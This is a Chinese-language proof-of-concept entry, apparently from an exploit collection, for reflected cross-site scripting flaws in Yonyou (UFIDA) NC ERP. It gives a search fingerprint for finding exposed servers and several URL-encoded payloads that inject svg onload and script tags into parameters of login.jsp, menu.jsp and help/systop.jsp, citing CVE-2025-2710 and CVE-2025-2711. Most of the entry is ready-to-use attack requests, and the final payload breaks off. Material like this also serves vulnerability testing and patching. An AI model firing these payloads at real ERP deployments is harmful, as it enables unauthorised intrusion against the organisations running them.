# 用友ERP-存在反射xss漏洞

- **系统**：用友　|　**类型**：XSS　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /login.jsp?onlyOnePerVM=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E HTTP/1.1`

**请求体 / payload**
```
/login.jsp?onlyOnePerVM=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
/login.jsp?redirect=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
/login.jsp?nodeid=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
Host:
Cookie: JSESSIONID=BF3228041EA1754F05630F3543A12C73.server
CVE-2025-2710
GET /menu.jsp?flag=%3C/script%3E%3Cscript%3Ealert(`helloWorld`)%3C/script%3E HTTP/1.1
Host:
Cookie: JSESSIONID=90EAE615C7A258C3A47F8BB708B061C5.server
CVE-2025-2711
Api
/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%…（脚本共 1020 字，完整版见原文）
```
- **预期**：200　|　—